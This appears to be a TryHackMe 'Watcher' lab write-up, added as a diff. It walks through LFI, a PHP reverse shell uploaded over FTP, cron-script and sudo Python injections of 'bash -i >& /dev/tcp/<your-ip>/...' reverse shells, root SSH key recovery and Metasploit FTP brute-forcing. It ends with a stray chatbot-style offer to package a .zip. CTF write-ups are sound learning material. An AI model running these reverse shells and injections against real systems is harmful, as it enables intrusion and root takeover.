@@ -1,0 +1,202 @@
+# Watcher – TryHackMe
+
+## Overview
+
+- **Goal**: Capture **7 hidden flags**
+- **Focus**: Web exploitation, privilege escalation
+- **Skills Covered**:
+  - Local File Inclusion (LFI)
+  - FTP login and file management
+  - Reverse shell deployment
+  - Crontab exploitation
+  - Python script manipulation
+  - Base64 decoding & SSH key usage
+  - Metasploit alternative exploitation
+
+## Tools Used
+
+| Tool        | Purpose                           |
+|-------------|-----------------------------------|
+| `nmap`      | Port scanning                     |
+| `dirsearch` | Directory brute forcing           |
+| `ftp`       | FTP login and file management     |
+| `netcat`    | Reverse shell listener            |
+| `vim/less`  | Terminal-based text editors       |
+| `john` / `hashcat` | Hash cracking              |
+| `Metasploit`| Automated exploitation (alternative) |
+
+## Step-by-Step Walkthrough
+
+### 1. Recon – Nmap Scan
+nmap -sV -T4 -p- <target-ip>
+
+**Result:**
+
+* Port 21 → FTP
+* Port 80 → HTTP
+* Port 22 → SSH
+
+### 2. Web Enumeration & Flag 01
+
+Use `dirsearch` or `gobuster`:
+dirsearch -u http://<target-ip> -e php,txt,html
+
+Found: `robots.txt`
+curl http://<target-ip>/robots.txt
+
+**Flag 01 captured** from `robots.txt`.
+
+### 3. LFI Exploitation & FTP Credentials – Flag 02
+
+Check parameters in the web app.
+Test for LFI vulnerability:
+http://<target-ip>/page?file=../../../../etc/passwd
+
+Confirmed vulnerable. Brute force parameters → discovered FTP credentials in config files.
+
+Login to FTP:
+ftp <target-ip>
+
+Enter discovered creds.
+
+View/download file:
+ls
+get flag2.txt
+less flag2.txt
+
+ **Flag 02 captured**.
+
+### 📡 4. Upload Reverse Shell via FTP – Flag 03
+
+Prepare PHP reverse shell (edit IP & port):
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'");
+?>
+
+Upload to FTP:
+put shell.php
+
+Set listener:
+nc -lvnp 4444
+
+Trigger shell:
+http://<target-ip>/uploads/shell.php
+
+ Reverse shell obtained → explore filesystem → discovered **Flag 03**.
+
+### 5. Privilege Escalation (sudo -l) – Flag 04
+
+Inside reverse shell:
+sudo -l
+
+Discovered ability to run as another user.
+
+Switch:
+sudo -u <username> bash
+
+Explore user’s home directory:
+ls -la
+cat flag4.txt
+
+ **Flag 04 captured**.
+
+### 6. Crontab Exploitation – Flag 05
+
+Check cronjobs:
+cat /etc/crontab
+
+Found: `/home/toby/cow.sh`
+
+Inject reverse shell:
+echo "bash -i >& /dev/tcp/<your-ip>/5555 0>&1" >> /home/toby/cow.sh
+
+Start listener:
+nc -lvnp 5555
+
+Wait for cron to execute → new shell as another user.
+ls
+cat flag5.txt
+
+ **Flag 05 captured**.
+
+
+### 7. Python Script Exploit – Flag 06
+
+Found `note.txt` → hint about scripts.
+Check sudo rights again:
+sudo -l
+
+Allowed to run `cmd.py` as root.
+
+Modify script:
+```python
+import os
+os.system('bash -i >& /dev/tcp/<your-ip>/6666 0>&1')
+
+Start listener:
+nc -lvnp 6666
+
+Run as root:
+sudo python3 /scripts/cmd.py
+
+Reverse shell as root. Explore → **Flag 06 captured**.
+
+### 8. Base64 RSA Key & Root SSH – Flag 07
+
+Check `/opt/backups`:
+ls /opt/backups
+cat /opt/backups/key.b64
+
+Decode:
+cat key.b64 | base64 -d > id_rsa
+chmod 600 id_rsa
+
+SSH as root:
+ssh -i id_rsa root@<target-ip>
+
+Read flag:
+cat /root/flag7.txt
+
+ **Flag 07 captured**.
+
+## Alternative Approach – Metasploit
+
+Instead of manual reverse shells, you can automate with Metasploit:
+
+1. Launch MSF:
+   msfconsole
+
+2. Search exploits:
+   search type:exploit name:ftp
+   search lfi
+
+3. Example module usage (FTP login):
+   use auxiliary/scanner/ftp/ftp_login
+   set RHOSTS <target-ip>
+   set USER_FILE users.txt
+   set PASS_FILE pass.txt
+   run
+
+4. If shell gained:
+   * Use `post/multi/recon/local_exploit_suggester`
+   * Escalate automatically
+   * Collect flags with `cat`
+ Metasploit simplifies exploitation but manual method builds real skills.
+
+
+## Reflection
+
+This lab reinforced:
+
+* Enumeration (robots.txt, LFI discovery)
+* FTP exploitation for file handling
+* Reverse shell deployment methods
+* Privilege escalation: sudo, cronjobs, script modification
+* Cryptography handling (RSA key extraction)
+
+It mirrors real-world attacker techniques in post-exploitation.
+
+
+Do you want me to also **package this as a `.zip` repo with folder structure** (like `scripts/`, `notes/`, `images/`) so you can upload directly to GitHub?
+```
